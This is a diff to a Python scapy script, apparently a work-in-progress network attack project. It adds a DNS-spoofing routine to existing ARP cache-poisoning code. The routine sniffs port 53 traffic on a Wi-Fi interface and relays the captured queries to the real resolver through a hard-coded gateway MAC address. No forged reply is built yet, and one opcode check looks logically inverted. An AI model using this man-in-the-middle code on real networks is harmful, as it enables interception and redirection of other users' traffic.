@@ -1,8 +1,11 @@
 from scapy.all import *
-from scapy.all import ARP, Ether, srp
+from scapy.all import ARP, Ether, srp, DNS, IP, UDP
 import psutil
-
+from dns.resolver import Resolver
 from util import get_prefix_length, apply_mask, AddressFamily
+
+# TODO: check length
+dns_server = Resolver().nameservers[0]
 
 def scan_hosts(subnet):
     """Scans the subnet (in cidr notation) and returns a list of hosts
@@ -80,6 +83,43 @@ def poison_arp_cache(interface_name, attacker, target1, target2):
     # repeat ARP replies every X seconds
 
 
+def process(packet):
+    if not packet.haslayer(DNS):
+        return
+    
+    if not packet[DNS].opcode != 1:
+        return
+
+    # Check if the DNS request is addressed to us
+    # if packet[Ether].dst != mac_address:
+    #     print('Addressed to us')
+    # else:
+    #     print('Not addressed to us')
+
+
+    request = Ether() / IP() / UDP() / DNS()
+    # hard-coded mac address of the gateway
+    request[Ether].dst = '34:64:a9:28:71:56'
+    request[IP].dst = Resolver().nameservers[0]
+    request[UDP].dport = 53
+    request[DNS].rd = 1
+    request[DNS].qd = packet[DNS].qd
+
+    answered, unanswered = srp(request)
+    (_, response) = answered[0]
+    response.show()
+
+
+def dns_spoofing():
+    # DNS is usually on port 53
+    sniff(filter='port 53', store=0, prn=process)
+
+
 interface = get_interfaces()['Wi-Fi']
-hosts = scan_hosts(interface['subnet'])
-print(hosts)
+mac_address = interface['mac_address']
+
+# hosts = scan_hosts(interface['subnet'])
+# print(hosts)
+
+dns_spoofing()
+
